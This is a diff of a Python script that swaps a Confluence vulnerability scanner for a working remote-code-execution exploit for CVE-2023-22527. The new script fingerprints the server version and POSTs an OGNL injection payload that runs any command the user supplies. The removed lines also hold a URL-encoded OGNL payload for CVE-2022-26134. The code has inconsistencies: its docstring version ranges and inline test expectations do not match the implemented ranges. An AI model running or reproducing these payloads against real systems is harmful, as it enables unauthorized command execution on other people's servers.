@@ -1,74 +1,109 @@
-import requests
 import argparse
+import requests
+from bs4 import BeautifulSoup
+from urllib.parse import urlparse
 
-# Display basic tool information
-def display_info():
-    info = """
-Category : Apache Confluence
-Developer : MIR Team
-Version   : 1.0.2
-Develop Time : 2025-1-10
-----------------------------------------------
-CVE-2022-26134, CVE-2021-26084, CVE-2023-22527
-"""
-    print(info)
+def get_confluence_version(url):
+    parsed_url = urlparse(url)
+    url = f"http://{parsed_url.netloc}/"
 
-# Display about information
-def show_about():
-    about_text = """
-    This is a Proof of Concept (PoC) for testing various vulnerabilities
-    in Apache HTTP Server including SSRF, Denial of Service, and Filename Confusion Attacks.
-    Developed by the A Cyber Security Team.
+    try:
+        response = requests.get(url)
+        response.raise_for_status()
+
+        soup = BeautifulSoup(response.text, 'html.parser')
+        version_span = soup.find('span', {'id': 'footer-build-information'})
+
+        if version_span:
+            confluence_version = version_span.text.strip()
+            return confluence_version
+
+    except requests.exceptions.RequestException as e:
+        print(f"Error: {e}")
+
+    return None
+
+# def check_exploitable_version(version):
+#     exploitable_versions = ['8.0.', '8.1.', '8.2.', '8.3.', '8.4.', '8.5.0', '8.5.1', '8.5.2', '8.5.3']
+#     for exploitable_version in exploitable_versions:
+#         if version.startswith(exploitable_version):
+#             return True
+#     return False
+
+def version_to_list(version):
     """
-    print(about_text)
+    Converts version string (e.g., '8.3.5') to a list of integers [8, 3, 5].
+    """
+    return list(map(int, version.split('.')))
 
-# Function to test the vulnerability with multiple bypass attempts
-def check_protected_file(target_url):
-    # List of potential attack URLs
-    test_urls = [
-        f"{target_url}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/", #CVE-2022-26134 (Atlassian Confluence RCE)
-        f"{target_url}/pages/doenterpagevariables.action?SpaceKey=x",     #CVE-2021-26084      
-        f"{target_url}/template/aui/text-inline.vm",           #CVE-2021-26084
-       
+def check_exploitable_version(version):
+    """
+    Checks if the given version is within any exploitable range.
+    Ranges: 8.3.1 to 8.3.5 and 7.3.2 to 7.3.5
+    """
+    version_list = version_to_list(version)
+
+    # Define exploitable ranges
+    exploitable_ranges = [
+        (version_to_list('8.5.1'), version_to_list('8.5.5')),
+        (version_to_list('7.3.2'), version_to_list('7.3.5'))
     ]
 
-    # Loop through each URL and test the response
-    for test_url in test_urls:
-        print(f"Testing URL: {test_url}")
-        response = requests.get(test_url)
-        
-        # Display response status code and check for potential bypass success
-        print(f"URL Status Code: {response.status_code}")
-        if response.status_code == 200:
-            print(f"[!] Bypass successful for URL: {test_url}")
-        elif response.status_code == 302:
-            print(f"[!] Check Bypass successful : {test_url}")
-        else:
-            print(f"[*] No bypass or blocked for URL: {test_url}")
-        print("-" * 50)
+    # Check if the version falls within any of the ranges
+    for start_version, end_version in exploitable_ranges:
+        if start_version <= version_list <= end_version:
+            return True
 
-# Function to handle command-line arguments
-def parse_arguments():
-    parser = argparse.ArgumentParser(description="Apache HTTP Server Vulnerability Testing Tool")
-    parser.add_argument('url', type=str, help='Target URL to test (e.g., http://example.com)')
-    parser.add_argument('--info', action='store_true', help='Display tool information')
-    parser.add_argument('--about', action='store_true', help='Show about this PoC')
-    return parser.parse_args()
+    return False
+
+# 테스트 코드
+print(check_exploitable_version('8.3.1'))  # True
+print(check_exploitable_version('8.3.5'))  # True
+print(check_exploitable_version('7.3.2'))  # True
+print(check_exploitable_version('7.3.5'))  # True
+print(check_exploitable_version('8.4.0'))  # False
+print(check_exploitable_version('7.2.9'))  # False
+
+def exploit(url, cmd):
+    confluence_version = get_confluence_version(url)
+
+    if confluence_version:
+        print(f"Confluence version: {confluence_version}")
+
+        if check_exploitable_version(confluence_version):
+            
+            url = f"{url}/template/aui/text-inline.vm"
+
+            http_proxy = "http://127.0.0.1:8080"
+            https_proxy = "http://127.0.0.1:8080"
+
+            headers = {
+                "Content-Type": "application/x-www-form-urlencoded"
+            }
+            data = r"label=\u0027%2b#request\u005b\u0027.KEY_velocity.struts2.context\u0027\u005d.internalGet(\u0027ognl\u0027).findValue(#parameters.x,{})%2b\u0027&x=@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',(new freemarker.template.utility.Execute()).exec({'"+ cmd +"'}))"
+
+            response = requests.post(url, headers=headers, data=data, verify=False)
+            if (response.headers.get("X-Cmd-Response")):
+                print("Command Output:")
+                print(response.headers.get("X-Cmd-Response"))
+            else:
+                print("No response")
+                
+        else:
+            print("The version cannot exploit the exploit")
+    else:
+        print("Unable to determine version of Confluence")
+
+def main():
+    parser = argparse.ArgumentParser(
+        description="Send request with url and cmd parameters",
+        usage="python3 CVE-2023-22527.py --url <url> --cmd <cmd>\nExample: python3 CVE-2023-22527.py --url http://192.168.139.202 --cmd \"whoami\""
+    )
+    parser.add_argument("--url", required=True, help="url address without http://")
+    parser.add_argument("--cmd", required=True, help="Value for the cmd parameter")
+
+    args = parser.parse_args()
+    exploit(args.url, args.cmd)
 
 if __name__ == "__main__":
-    # Automatically display tool info when the script starts
-    display_info()
-
-    # Parse command-line arguments
-    args = parse_arguments()
-
-    # Display about information if --about is provided
-    if args.about:
-        show_about()
-    
-    # Run the attack check if --target is provided
-    if args.url:
-        check_protected_file(args.url)
-    else:
-        if not args.info and not args.about:
-            print("Please provide a target URL with --target, or use --info or --about for more information.")
+    main()
